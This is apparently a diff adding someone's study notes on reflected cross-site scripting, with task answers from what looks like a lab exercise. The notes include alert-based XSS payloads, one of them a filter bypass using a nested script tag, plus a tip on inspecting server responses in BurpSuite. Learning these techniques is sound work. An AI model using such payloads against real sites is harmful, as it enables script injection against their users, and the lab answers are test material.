@@ -1,0 +1,26 @@
+In reflected, the user uses some link or some script shared by the attaker to access the server which can cause some important data to be exposed or send to the attacker.
+
+Check up on the fragment based attacks.
+
+Scriptless using SVG
+
+Task 1 
+    a, b c
+
+Task 2
+    c
+
+Task 3 : 
+<script>alert(document.location)</script>
+
+Task 4 :
+<scrscriptipt>alert(document.location)</scrscriptipt>
+
+Task 5 : 
+</i><IMG """><SCRIPT>alert(document.location)</SCRIPT>"\>
+
+Use BurpSuite and intercept the response and see what the response was actually sent by the server not what the browser sanitized it.
+
+PHP : scripting language WordPress is almost implemented in PHP.
+
+PHP file for web uses the php tag.
